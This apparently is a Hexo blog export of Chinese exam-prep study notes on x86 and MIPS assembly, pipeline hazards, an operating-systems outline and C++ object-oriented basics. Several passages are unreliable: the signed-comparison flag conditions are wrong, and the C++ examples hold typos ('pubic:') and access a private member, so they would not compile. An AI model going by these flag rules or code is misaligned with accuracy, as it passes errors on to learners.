<h4 id="⭐（六）CISC和RISC的基本概念"><a href="#⭐（六）CISC和RISC的基本概念" class="headerlink" title="⭐（六）CISC和RISC的基本概念"></a>⭐（六）CISC和RISC的基本概念</h4><ol>
<li>编译器、汇编器、链接器的基本概念</li>
<li>⭐选择结构语句的机器级表示</li>
<li>⭐循环结构语句的机器级表示</li>
<li>⭐过程（函数）调⽤对应的机器级表示</li>
</ol>
<hr>
<h2 id="star2-解题方法"><a href="#star2-解题方法" class="headerlink" title=":star2:解题方法"></a>:star2:解题方法</h2><h4 id="先观察汇编语⾔，是x86还是MIPS？"><a href="#先观察汇编语⾔，是x86还是MIPS？" class="headerlink" title="先观察汇编语⾔，是x86还是MIPS？"></a>先观察汇编语⾔，是x86还是MIPS？</h4><p>​    :one:观察是否有注释<br>​    :two:观察指令长度是否固定<br>​       &gt; - <strong><code>x86</code>属于<code>CISC</code>，指令长度不固定</strong><br>​       &gt; - <strong><code>MIPS</code>属于<code>RISC</code>，指令长度固定</strong></p>
<p>   :three:观察是否有注释</p>
<hr>
<h4 id="x86"><a href="#x86" class="headerlink" title="x86"></a><code>x86</code></h4><ol>
<li><p>先搞懂<code>C语言</code></p>
</li>
<li><p>基于<code>C语言</code>的逻辑分析机器指令</p>
<ul>
<li>有没有分支结构？ —— 观察有没有<code>jxxx</code>指令</li>
<li>有没有循环结构？<blockquote>
<ul>
<li><strong>观察没有<code>jxxx</code>指令</strong></li>
<li><strong>观察没有<code>loopjxxx</code>指令</strong></li>
</ul>
</blockquote>
</li>
<li>有没有函数调⽤？<blockquote>
<ul>
<li><strong>观察有没有 <code>call</code> 指令</strong></li>
<li><strong>观察有没有 <code>ret</code> 指令</strong></li>
</ul>
</blockquote>
</li>
<li>需不需要访问函数调⽤参数？观察在汇编语⾔中如何访问调⽤参数？ <blockquote>
<p>注：函数在调用参数一般在<code>[ebp+8]</code>、<code>[ebp+12]</code>等位置</p>
</blockquote>
</li>
<li>需不需要定义局部变量？观察在汇编语⾔中如何访问局部变量？<blockquote>
<p>注：局部变量的存储地址⼀般在 <code>[ebp-4]</code>、<code>[ebp-8]</code>、<code>[ebp-12]</code> 等位置</p>
</blockquote>
</li>
</ul>
</li>
</ol>
<hr>
<h4 id="MIPS"><a href="#MIPS" class="headerlink" title="MIPS"></a><code>MIPS</code></h4><ul>
<li>先搞懂<code>C语言</code></li>
<li><p>基于<code>C语言</code>的逻辑分析机器指令</p>
<ul>
<li>有没有分支结构？</li>
<li>有没有循环结构？</li>
<li>有没有函数调用？</li>
</ul>
</li>
<li><p>考不考流水线？</p>
<ul>
<li>对指令进行分类 —— 五类指令，每一类指令的运行原理要搞清楚</li>
<li>安排指令流水线</li>
<li>分析数据冒险、控制冒险</li>
</ul>
</li>
</ul>
<hr>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h4 id="x86汇编指令（重点关注-intel-格式）"><a href="#x86汇编指令（重点关注-intel-格式）" class="headerlink" title="x86汇编指令（重点关注 intel 格式）"></a>x86汇编指令（重点关注 intel 格式）</h4><ul>
<li><p>算数、逻辑运算类指令 加、减、乘、除、左移、右移 等指令</p>
</li>
<li><p>分⽀结构（if/else）</p>
<ul>
<li>⽆条件转移（<code>goto</code>）—— <code>jmp</code> （⽆条件转移指令），类似于<code>C语⾔</code>的<code>goto</code></li>
<li><p>条件转移指令（<code>if</code>/<code>else</code>）<br>  ① <code>cmp A，B</code> （本质是 A-B，A-B 的标志位信息会存放在PSW中)<br>  会存放到PSW中）<br>  ② <code>jxxx</code> （转移指令指令）</p>
<ul>
<li>⽆符号数减法关注 <code>CF</code>、<code>ZF</code><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A == B   —— 需要满足 ZF == 1</span><br><span class="line">A != B   —— 需要满足 ZF == 0</span><br><span class="line">A &gt;= B   —— 需要满足 CF == 0</span><br><span class="line">A &lt;= B   —— 需要满足 CF == 1 || ZF == 1</span><br><span class="line">A &gt; B    —— 需要满足 CF == 0 &amp;&amp; ZF == 0</span><br><span class="line">A &lt; B    —— 需要满足 CF == 1</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>有符号数减法关注 <code>OF</code>、<code>SF</code>、<code>ZF</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A == B   —— 需要满足 ZF == 1</span><br><span class="line">A != B   —— 需要满足 ZF == 0</span><br><span class="line">A &gt;= B   —— 需要满足 ZF == 0</span><br><span class="line">A &lt;= B   —— 需要满足 SF == OF</span><br><span class="line">A &gt; B    —— 需要满足 SF!=0F || ZF == 1</span><br><span class="line">A &lt; B    —— 需要满足 SF!=0F &amp;&amp; ZF == 0</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<blockquote>
<p>==转移类指令，通常采⽤相对寻址。⽤补码表示偏移量。==</p>
<p>==补码的值通常意味着PC要 往前/往后 跳多少个地址（注意：偏移量的单位可能是字节，也可能是指令字⻓）==</p>
<p>x86属于CISC，指令字⻓不固定，因此转移类指令中⼀定是以“字节”为单位描述PC的偏移量<sup><a href="#fn_对比二者" id="reffn_对比二者">对比二者</a></sup></p>
<ul>
<li>循环结构（<code>for while</code>）<ul>
<li><code>xxxloopxxxx &lt;label&gt;</code> 原理同跳转指令</li>
<li>条件跳转指令<code>jLxxxx</code> 也可以⽤于实现循环</li>
</ul>
</li>
</ul>
</blockquote>
<ul>
<li>函数调⽤/返回<ul>
<li>调⽤指令 <code>call &lt;label&gt;</code><ul>
<li>当前PC值压栈保存，再修改PC的值，跳转到<code>&lt;label&gt;</code></li>
<li>与⽆条件转移指令<code>jmp</code>的区别 call 指令会将函数返回地址(当前的<code>PC</code>)⼊栈<br>返回指令 —— <code>ret</code> 恢复程序计数器<code>PC</code>，返回原函数</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h4 id="MIPS-汇编指令（重点关注-intel-格式）"><a href="#MIPS-汇编指令（重点关注-intel-格式）" class="headerlink" title="MIPS 汇编指令（重点关注 intel 格式）"></a>MIPS 汇编指令（重点关注 intel 格式）</h4><ol>
<li><p>算数、逻辑运算类指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">加 —— OP：add</span><br><span class="line">减 —— OP：sub</span><br><span class="line">乘 —— OP：mul</span><br><span class="line">除 —— OP：div</span><br><span class="line">左移 —— OP：shl</span><br><span class="line">右移 —— OP：shr</span><br></pre></td></tr></table></figure>
</li>
<li><p>⽆条件转移指令</p>
<ul>
<li><code>j</code> —— <code>j &lt;label&gt;</code></li>
<li><code>b</code> —— <code>b &lt;lable&gt;</code></li>
</ul>
</li>
<li><p>条件转移指令 <code>bxxx</code> ——<code>b</code>开头，意思是 <strong>branch</strong></p>
<blockquote>
<p><strong>转移类指令（2. / 3.）</strong>，通常采⽤相对寻址。⽤补码表示偏移量。</p>
<p>补码的值通常意味着<code>PC</code>要 往前/往后 跳多少个地址</p>
<p>（注意：偏移量的单位可能是字节，也可能是指令字⻓）</p>
<hr>
<p><code>MIPS</code>属于<code>RISC</code>，指令字⻓固定，因此转移类指令中</p>
<p>可能会以“指令字⻓”为单位描述PC的偏移量（参考 2013年真题）<sup><a href="#fn_对比二者" id="reffn_对比二者">对比二者</a></sup></p>
</blockquote>
</li>
</ol>
<blockquote id="fn_对比二者">
<sup>对比二者</sup>. 对比二者的区别<a href="#reffn_对比二者" title="Jump back to footnote [对比二者] in the text."> &#8617;</a>
</blockquote>
<ol>
<li><p><code>Load</code>指令  ——<code>Load</code> 寄存器，内存地址</p>
</li>
<li><p><code>Store</code>指令  ——<code>Store</code>内存地址，寄存器 </p>
<blockquote>
<p><code>Load</code>指令和<code>`Store</code>指令是唯二会访存的指令</p>
</blockquote>
</li>
<li><p>:flags: 结合五段式指令流水线考察</p>
<ul>
<li><p>数据冒险 —— 什么指令可能导致数据冒险？</p>
<ul>
<li>前⾯的指令：写某个寄存器 <code>WB</code>，第五个段</li>
<li>后⾯的指令：读（同⼀个）寄存器 —— <code>ID</code>，第⼆个段</li>
<li>分析思路  <ul>
<li>⼀条⼀条指令从前往后分析，如果⼀条指令写了某个寄存器，<br>则观察与之相邻的3条指令中，有没有哪条指令需要读同⼀个寄存器</li>
<li>当后⾯的指令和前⾯的指令中间，还有其他三条指令时，才不会发⽣数据冒险</li>
</ul>
</li>
</ul>
</li>
<li><p>控制冒险 —— 什么指令可能导致控制冒险？——会改变PC值的</p>
<ul>
<li><p>⽆条件转移（注：<code>call</code>、<code>ret</code>属于⽆条件转移）</p>
<ul>
<li><p><code>EX</code>，第三个段改变<code>PC</code></p>
</li>
<li><p>处理控制冒险的⽅法：停两个周期，再取下⼀条</p>
<p>指令（IF段），就不会发⽣控制冒险</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>有条件转移</p>
<ul>
<li><code>M</code>，第四个段改变<code>PC</code></li>
<li>处理控制冒险的⽅法：停三个周期，再取下⼀条指令（<code>IF</code>段），就不会发⽣控制冒险</li>
<li>若未发⽣转移（不满⾜条件），则不会发⽣控制冒险</li>
</ul>
</li>
<li></li>
</ul>
</li>
</ol>
<p><img src="C:/Users/FAN/AppData/Roaming/Typora/typora-user-images/image-20240810194506572.png" alt="image-20240810194506572"></p>
<ul>
<li><p><strong>运算类指令</strong></p>
</li>
<li><p><code>IF</code>：根据PC从指令<code>`Cache</code>取指令至<code>IF</code>段的锁存器</p>
</li>
<li><p><code>ID</code>: 取出操作数至<code>ID</code>段锁存器</p>
</li>
<li><p><code>EX</code>: 运算, 将结果存入<code>EX</code>段锁存器</p>
</li>
<li><p><code>M</code>: <strong>空段</strong></p>
</li>
<li><p><code>WB</code>: 将运算结果写回指定寄存器</p>
</li>
</ul>
<ul>
<li><p><strong>LOAD指令</strong></p>
</li>
<li><p><code>IF</code>：根据PC从指令<code>`Cache</code>取指令至<code>IF</code>段的锁存器</p>
</li>
<li><p><code>ID</code>: 将基址寄存器的值放到锁存器<code>A</code>, 将偏移量的值放到<code>Imm</code></p>
</li>
<li><p><code>EX</code>: 运算, 得到有效地址</p>
</li>
<li><p><code>M</code>: 从数据<code>Cache</code>中取数并放入锁存器</p>
</li>
<li><p><code>WB</code>: 将运算结果写回指定寄存器</p>
</li>
</ul>
<ul>
<li><strong>STORE指令</strong></li>
<li><code>IF</code>：根据<code>PC</code>从指令<code>Cache</code>取指令至<code>IF</code>段的锁存器</li>
<li><code>ID</code>: 将基址寄存器的值放到锁存器<code>A</code>, 将偏移量的值放到<code>Imm</code>. 将要存的数放到B</li>
<li><code>EX</code>: 运算, 得到有效地址. 并将锁存器<code>B</code>的内容放到锁存器<code>Store</code></li>
<li><code>M</code>: 写入<code>cache</code></li>
<li><code>WB</code>: <strong>空段</strong></li>
</ul>
<ul>
<li><strong>条件转移指令</strong></li>
<li><code>IF</code>：根据<code>PC</code>从指令<code>Cache</code>取指令至<code>IF</code>段的锁存器</li>
<li><code>ID</code>: 进行比较的两个数放入锁存器<code>A</code>, <code>B</code>; 偏移量放入<code>Imm</code></li>
<li><code>EX</code>: 运算, 比较两个数</li>
<li><code>M</code>: 将目标<code>PC</code>值写回<code>PC</code>(图没画全)</li>
<li><code>WB</code>: <strong>空段</strong><blockquote>
<p>很多教材把写回<code>PC</code>的功能段称为<code>WrPC</code>段, 其耗时比<code>M</code>段更短,可安排在<code>M</code>段时间内完成</p>
</blockquote>
</li>
</ul>
<ul>
<li><strong>无条件转移指令</strong></li>
<li><code>IF</code>：根据<code>PC</code>从指令<code>Cache</code>取指令至<code>IF</code>段的锁存器</li>
<li><code>ID</code>: 偏移量放入<code>Imm</code></li>
<li><code>EX</code>: 将目标PC值写回PC(图没画全)</li>
<li><code>M</code>: <strong>空段</strong></li>
<li><code>WB</code>: <strong>空段</strong></li>
</ul>
<hr>
<h2 id="MIPS-汇编指令（重点关注-intel-格式）-1"><a href="#MIPS-汇编指令（重点关注-intel-格式）-1" class="headerlink" title="MIPS 汇编指令（重点关注 intel 格式）"></a>MIPS 汇编指令（重点关注 intel 格式）</h2><h4 id="x86汇编语言-AT-amp-T和Intel格式的区别"><a href="#x86汇编语言-AT-amp-T和Intel格式的区别" class="headerlink" title="x86汇编语言, AT&amp;T和Intel格式的区别"></a><code>x86</code>汇编语言, <code>AT&amp;T</code>和<code>Intel</code>格式的区别</h4><p><img src="https://s2.loli.net/2024/08/10/XF56PQgBJKnDMYy.png" alt="image-20240810200554222"></p>
]]></content>
      <categories>
        <category>408</category>
      </categories>
      <tags>
        <tag>408</tag>
        <tag>计算机组成原理</tag>
      </tags>
  </entry>
  <entry>
    <title>CMake 的简单使用</title>
    <url>/2024/05/21/Study/CMake%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%9E%E7%94%A8/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>CE的工作原理 笔记</title>
    <url>/2024/05/12/Study/408-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<p>参考的书是王道复习指导书</p>
<p>[TOC]</p>
<h1 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h1><p>内存管理以及文件管理:</p>
<h1 id="第一章：操作系统概述与发展历史"><a href="#第一章：操作系统概述与发展历史" class="headerlink" title="第一章：操作系统概述与发展历史"></a>第一章：操作系统概述与发展历史</h1><h2 id="操作系统的基本概念"><a href="#操作系统的基本概念" class="headerlink" title="操作系统的基本概念"></a>操作系统的基本概念</h2><p>操作系统自下而上管理软件和硬件 大致可以分为以下几个部分</p>
<p><pre class="mermaid">graph TD
    A[硬件] --> B[操作系统] --> C[应用程序] --> D[用户]</pre></p>
<h2 id="操作系统的特征"><a href="#操作系统的特征" class="headerlink" title="操作系统的特征"></a>操作系统的特征</h2><ol>
<li>并发 <strong>宏观上并行, 微观上串行</strong> 微观上程序仍然是</li>
<li>共享 <ul>
<li>互斥的共享访问<ul>
<li>对<code>临界资源</code>的互斥访问,见进程调度</li>
</ul>
</li>
<li>同时访问<ul>
<li><a href="#读者写者代码">读者写者问题</a></li>
</ul>
</li>
</ul>
</li>
<li>虚拟<ul>
<li><code>SPOOLing(假脱机)技术</code></li>
<li>虚拟内存(外内存交换 - 有缺页现象)</li>
<li></li>
</ul>
</li>
<li>异步<br> 多道程序设计允许多个程序<code>并发</code>运行<ul>
<li>单核CPU同一时间只能对同一个<code>线程</code>或者<code>进程</code>进行调度<h2 id="操作系统的目标与功能"><a href="#操作系统的目标与功能" class="headerlink" title="操作系统的目标与功能"></a>操作系统的目标与功能</h2></li>
</ul>
</li>
</ol>
<h1 id="第二章：进程相关概念与进程调度"><a href="#第二章：进程相关概念与进程调度" class="headerlink" title="第二章：进程相关概念与进程调度"></a>第二章：进程相关概念与进程调度</h1><h4 id="读者写者代码"><a href="#读者写者代码" class="headerlink" title="读者写者代码"></a>读者写者代码</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="第三章：内存管理"><a href="#第三章：内存管理" class="headerlink" title="第三章：内存管理"></a>第三章：内存管理</h1><h1 id="第四章：文件管理"><a href="#第四章：文件管理" class="headerlink" title="第四章：文件管理"></a>第四章：文件管理</h1><h1 id="第五章：I-O设备及其管理（与计算机组成原理高度相关）"><a href="#第五章：I-O设备及其管理（与计算机组成原理高度相关）" class="headerlink" title="第五章：I/O设备及其管理（与计算机组成原理高度相关）"></a>第五章：I/O设备及其管理（与计算机组成原理高度相关）</h1>]]></content>
  </entry>
  <entry>
    <title>OOP 面向对象编程学习(翁凯)</title>
    <url>/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>翁凯的C++学习笔记1</p>
<h1 id="OOP-面向对象编程学习"><a href="#OOP-面向对象编程学习" class="headerlink" title="OOP 面向对象编程学习"></a><a href="https://www.bilibili.com/video/BV1dE41167hJ">OOP 面向对象编程学习</a></h1><blockquote>
<p> function是一段通过名字调用的代码，它可以接受数据进行操作，并可能会有返回值。    method是一段通过关联在对象上的名字调用的代码。</p>
</blockquote>
<h2 id="第三节-什么是面向对象编程-Object-Oriented"><a href="#第三节-什么是面向对象编程-Object-Oriented" class="headerlink" title="第三节,什么是面向对象编程? Object-Oriented"></a>第三节,什么是面向对象编程? Object-Oriented</h2><p>​        Objects = Attributes + Services;<br>​        Data: the properties or status<br>​        Operations: the functions</p>
<h3 id="Messages-are"><a href="#Messages-are" class="headerlink" title="Messages are"></a>Messages are</h3><ul>
<li>Composed by sender</li>
<li>Interpreted by the receiver</li>
<li>Implemented by methods</li>
</ul>
<h3 id="Messages"><a href="#Messages" class="headerlink" title="Messages"></a>Messages</h3><ul>
<li>May cause receiver to change state</li>
<li>May return results</li>
</ul>
<h3 id="通过-函数-返回值-反馈-对东西进行分析"><a href="#通过-函数-返回值-反馈-对东西进行分析" class="headerlink" title="通过(函数?返回值?)反馈, 对东西进行分析"></a>通过(函数?返回值?)反馈, 对东西进行分析</h3><h4 id="Objects-cat"><a href="#Objects-cat" class="headerlink" title="Objects(cat)"></a>Objects(cat)</h4><ul>
<li>Represent things, events or concepts</li>
<li>respond to messages at run-time</li>
</ul>
<h4 id="Classes-cat-class"><a href="#Classes-cat-class" class="headerlink" title="Classes (cat class)"></a>Classes (cat class)</h4><ul>
<li>Define properties or instances</li>
<li>Act like types in C++</li>
</ul>
<h3 id="Class-gt-define-Object"><a href="#Class-gt-define-Object" class="headerlink" title="Class -&gt;define Object"></a>Class -&gt;define Object</h3><h3 id="Object-gt-is-a-Class"><a href="#Object-gt-is-a-Class" class="headerlink" title="Object-&gt;is a Class"></a>Object-&gt;is a Class</h3><h3 id="总结的面向对象的五种特点"><a href="#总结的面向对象的五种特点" class="headerlink" title="总结的面向对象的五种特点"></a>总结的面向对象的五种特点</h3><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/c++学习\image-20220716141656704.png" alt="image-20220716141656704"></p>
<p>telling program what to do</p>
<h3 id="通过接口对类打交道"><a href="#通过接口对类打交道" class="headerlink" title="通过接口对类打交道"></a>通过接口对类打交道</h3><h4 id="Functions-of-the-interface-接口"><a href="#Functions-of-the-interface-接口" class="headerlink" title="Functions of the interface (接口)"></a>Functions of the interface (接口)</h4><ul>
<li>Communication  (transportation)    </li>
<li>Protection  </li>
</ul>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/c++学习\image-20220716144836781.png" alt="**image-20220716144836781**"></p>
<h3 id="Encapsulation-封装"><a href="#Encapsulation-封装" class="headerlink" title="Encapsulation (封装)"></a>Encapsulation (封装)</h3><ol>
<li>把数据和操作数据的方法封装到里头</li>
<li><strong>隐藏数据和操作的详细信息</strong></li>
<li>限制进入公共方法的入口</li>
</ol>
<ul>
<li>bundle data and methods dealing with these data together in an object.</li>
<li>Hide the details of the data and the action.</li>
<li>Restrict only access to the publicized methods.</li>
</ul>
<h3 id="继承"><a href="#继承" class="headerlink" title="(继承)"></a>(继承)</h3><h3 id="多态性"><a href="#多态性" class="headerlink" title="(多态性)"></a>(多态性)</h3><h1 id="第四节-售票机的例子"><a href="#第四节-售票机的例子" class="headerlink" title="第四节 售票机的例子"></a>第四节 售票机的例子</h1><h2 id="TicketMachine-类"><a href="#TicketMachine-类" class="headerlink" title="TicketMachine 类"></a>TicketMachine 类</h2><p>PRICE<br>BALANCE<br>total;</p>
<hr>
<p>ShowPrompt<br>getMoney<br>printTicket<br>printError</p>
<p>由以上可以做出一个制作类</p>
<p>:: reslover</p>
<p>::  域的解析符号</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">S::f</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	::<span class="built_in">f</span>(); <span class="comment">//Would be recursive otherwisd;</span></span><br><span class="line">    :: a++;<span class="comment">// Select the global &#x27;a</span></span><br><span class="line">    a--; <span class="comment">// The a at class scope</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//类的定义 以及函数声明 (构造函数)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TicketMachine</span> &#123;</span></span><br><span class="line">    pubic:</span><br><span class="line">    	<span class="built_in">TicketMachine</span>(); <span class="comment">//不用管</span></span><br><span class="line">    	<span class="keyword">virtual</span> ~<span class="built_in">TicketMachine</span>(); <span class="comment">//不用管</span></span><br><span class="line">    	<span class="function"><span class="keyword">void</span> <span class="title">showPrompt</span><span class="params">()</span></span>; <span class="comment">//</span></span><br><span class="line">    	<span class="function"><span class="keyword">void</span> <span class="title">insertmoney</span><span class="params">(<span class="keyword">int</span> money)</span></span>;</span><br><span class="line">    	<span class="function"><span class="keyword">void</span> <span class="title">showbalance</span><span class="params">()</span></span>;</span><br><span class="line">    	<span class="function"><span class="keyword">void</span> <span class="title">printTicket</span><span class="params">()</span></span>;</span><br><span class="line">    	<span class="function"><span class="keyword">void</span> <span class="title">showTotal</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    	<span class="keyword">const</span> <span class="keyword">int</span> PRICE; <span class="comment">//const 需要初始化</span></span><br><span class="line">    	<span class="keyword">int</span> balance;</span><br><span class="line">    	<span class="keyword">int</span> total;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 函数的定义 (解析函数) 类名::函数()&#123; //TODO something;&#125; </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TicketMachine::showPrompt</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;something&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TicketMachine::insertMoney</span><span class="params">(<span class="keyword">int</span> money)</span></span>&#123;</span><br><span class="line">    balance +=money <span class="comment">//balance 类成员变量;money 用户赋予的值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在main函数中使用</span></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">main</span>()&#123;</span><br><span class="line">    TicketMachine tm;</span><br><span class="line">    tm.balance = <span class="number">0</span>;</span><br><span class="line">    tm.<span class="built_in">insertMoney</span>(<span class="number">100</span>);</span><br><span class="line">    tm.<span class="built_in">showBalance</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">printf: <span class="number">100</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="第五章-头文件"><a href="#第五章-头文件" class="headerlink" title="第五章 头文件"></a>第五章 头文件</h1><blockquote>
<ul>
<li>In C++,separated .h and .cpp files are used to define one class</li>
<li>Class declaretion and prototypes in that class are in the header file (.h). ///prototypes: 函数原型 在头文件中声明 类和函数原型</li>
<li>All the bodies(definitions) of these functions are in the source file (.cpp) 在函数主体中定义类</li>
</ul>
</blockquote>
<h2 id="The-header-files"><a href="#The-header-files" class="headerlink" title="The header files"></a>The header files</h2><h3 id="Structure-of-C-program"><a href="#Structure-of-C-program" class="headerlink" title="Structure of C++ program"></a>Structure of C++ program</h3><h1 id="编译预处理"><a href="#编译预处理" class="headerlink" title="(编译预处理)"></a>(编译预处理)</h1><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220730003555699.png" alt="image-20220730003555699"></p>
<blockquote>
<h1 id="include-指文本插入"><a href="#include-指文本插入" class="headerlink" title="include 指文本插入"></a>include 指文本插入</h1></blockquote>
<h2 id="Declararions-vs-Definitions-那些东西是声明（declaration）-那些东西是定义（definitions）？"><a href="#Declararions-vs-Definitions-那些东西是声明（declaration）-那些东西是定义（definitions）？" class="headerlink" title="Declararions vs. Definitions (那些东西是声明（declaration） 那些东西是定义（definitions）？)"></a>Declararions vs. Definitions (那些东西是声明（declaration） 那些东西是定义（definitions）？)</h2><ul>
<li>A.cpp file is a compile unit</li>
<li>Only declarations are allowed to be in .h<ul>
<li>extern variables</li>
<li>function prototypes （没有大括号-&gt; 原型）(有大括号 -&gt; 定义)</li>
<li>class/struct declaration</li>
</ul>
</li>
</ul>
<p>在头文件中放 Defintion 容易出现 duplication 问题                                                                                              </p>
<h2 id="include"><a href="#include" class="headerlink" title="#include"></a>#include</h2><ul>
<li><h1 id="include-is-to-insert-the-included-file-into-the-cpp-file-at-where-the-include-statement-is"><a href="#include-is-to-insert-the-included-file-into-the-cpp-file-at-where-the-include-statement-is" class="headerlink" title="include is to insert the included file into the .cpp file at where the #include statement is."></a>include is to insert the included file into the .cpp file at where the #include statement is.</h1><ul>
<li><h1 id="include”xx-h”-first-search-in-the-current-directory-then-the-direcories（目录）-declared-somewhere"><a href="#include”xx-h”-first-search-in-the-current-directory-then-the-direcories（目录）-declared-somewhere" class="headerlink" title="include”xx.h” :first search in the current directory, then the direcories（目录） declared somewhere"></a>include”xx.h” :first search in the current directory, then the direcories（目录） declared somewhere</h1></li>
<li><h1 id="include-search-in-the-specified-direcories（目录）"><a href="#include-search-in-the-specified-direcories（目录）" class="headerlink" title="include : search in the specified direcories（目录）"></a>include<xx.h> : search in the specified direcories（目录）</xx.h></h1></li>
<li><h1 id="include-lt-xx-gt-same-as-include"><a href="#include-lt-xx-gt-same-as-include" class="headerlink" title="include&lt; xx &gt; :same as #include "></a>include&lt; xx &gt; :same as #include <xx.h></xx.h></h1></li>
</ul>
</li>
</ul>
<h2 id="Standard-header-file-structure"><a href="#Standard-header-file-structure" class="headerlink" title="Standard header file structure"></a>Standard header file structure</h2><h1 id="ifndef-…-条件编译"><a href="#ifndef-…-条件编译" class="headerlink" title="ifndef … (条件编译)"></a>ifndef … (条件编译)</h1><h1 id="define-…"><a href="#define-…" class="headerlink" title="define …**"></a>define …<em>**</em></h1><h1 id="endif-（宏定义）"><a href="#endif-（宏定义）" class="headerlink" title="endif //（宏定义）"></a>endif //（宏定义）</h1><h2 id="Tips-for-header"><a href="#Tips-for-header" class="headerlink" title="Tips for header"></a>Tips for header</h2><ol>
<li>One class declaration per header file </li>
<li>Associated with one source file in the same prefix of file name.</li>
<li>The contentsof aheader file is surrounded with #ifnedf  #define   #endlf</li>
</ol>
<p>绝对不允许 #include<xx.cpp> (.cpp 里全是body(definition)容易造成重复)  </xx.cpp></p>
<h1 id="第六章时钟的例子"><a href="#第六章时钟的例子" class="headerlink" title="第六章时钟的例子"></a>第六章时钟的例子</h1><h3 id="Clock-display"><a href="#Clock-display" class="headerlink" title="Clock display"></a>Clock display</h3><ul>
<li>Abstraction is the ability to ignore details of parts to focus attention on a higher level of a problem.</li>
<li>Modularization is the process of dividing a whole into well-defined ways.</li>
</ul>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220802005921923.png" alt="image-20220802005921923"></p>
<h2 id="implementation-NumberDisplay"><a href="#implementation-NumberDisplay" class="headerlink" title="implementation - NumberDisplay"></a>implementation - NumberDisplay</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NumberDisplay</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> limit;</span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="comment">//Constructor and methods omitted 省略结构和方法...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="第六章-成员变量"><a href="#第六章-成员变量" class="headerlink" title="第六章 成员变量"></a>第六章 成员变量</h1><h2 id="Local-variable"><a href="#Local-variable" class="headerlink" title="Local variable"></a>Local variable</h2><ul>
<li>Local various are defined inside a method,have a scope limited to the method to which they belong.(在一个函数里面定义的变量为本地变量)；（本地变量有本地变量的作用域）；）</li>
</ul>
<p>与之相反有成员变量，在类中定义。</p>
<h2 id="A-local-varible-of-the-same-as-a-field-will-present-the-field-being-accessed-from-within-a-method"><a href="#A-local-varible-of-the-same-as-a-field-will-present-the-field-being-accessed-from-within-a-method" class="headerlink" title="A local varible of the same as a field will present the field being accessed from within a method"></a>A local varible of the same as a field will present the field being accessed from within a method</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220804231613660.png" alt="image-20220804231613660"></p>
<p>Field(成员变量), parameters（参数）, local variables（本地变量）</p>
<p><strong>类内声明，类外定义</strong></p>
<p>Field is in the class like function.</p>
<p>parameters==local variables (进入函数之前，这些东西都存在，离开之后都不存在)—-(存在堆栈中)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    	<span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    	<span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">A::f</span><span class="params">()</span></span>&#123;</span><br><span class="line">    i=<span class="number">20</span>;</span><br><span class="line">    std::cout&lt;&lt;i&lt;&lt;std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    A a;</span><br><span class="line">    A b;</span><br><span class="line">    std::cout&lt;&lt;a.i&lt;&lt;std::endl;</span><br><span class="line">    a.<span class="built_in">f</span>(); <span class="comment">// f() 